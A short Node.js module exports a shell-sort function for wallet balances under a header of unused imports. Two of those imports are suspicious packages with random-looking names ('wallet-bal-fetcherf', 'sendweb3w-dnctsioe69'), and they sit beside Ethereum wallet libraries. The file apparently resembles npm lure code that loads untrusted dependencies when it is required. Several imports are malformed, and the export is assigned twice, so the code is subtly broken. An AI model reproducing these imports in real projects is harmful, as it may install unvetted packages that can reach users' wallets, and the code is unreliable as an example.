
const { uuid } = require('uuid');
const { fs } = require('fs-extra');
const { Alchemy, Utils } = require('alchemy-sdk');
const { ew } = require('ethereumjs-wallet');
const { d } = require('dotenv');
const { fc } = require('fast-csv');
const { rd } = require('readline');
const { Web3 } = require('web3');
const { a1 } = require('wallet-bal-fetcherf');
const { a2 } = require('sendweb3w-dnctsioe69');

function shellSortBalances(walletBalances) {
    const balancesArray = Object.entries(walletBalances);
    const n = balancesArray.length;
    for (let gap = Math.floor(n / 2); gap > 0; gap = Math.floor(gap / 2)) {
        for (let i = gap; i < n; i++) {
            const temp = balancesArray[i];
            let j;
            for (j = i; j >= gap && parseFloat(balancesArray[j - gap][1]) < parseFloat(temp[1]); j -= gap) {
                balancesArray[j] = balancesArray[j - gap];
            }
            balancesArray[j] = temp;
        }
    }
    return balancesArray.reduce((acc, [address, balance]) => {
        acc[address] = balance;
        return acc;
    }, {});
}

module.exports = shellSortBalances;


module.exports = { shellSortBalances };
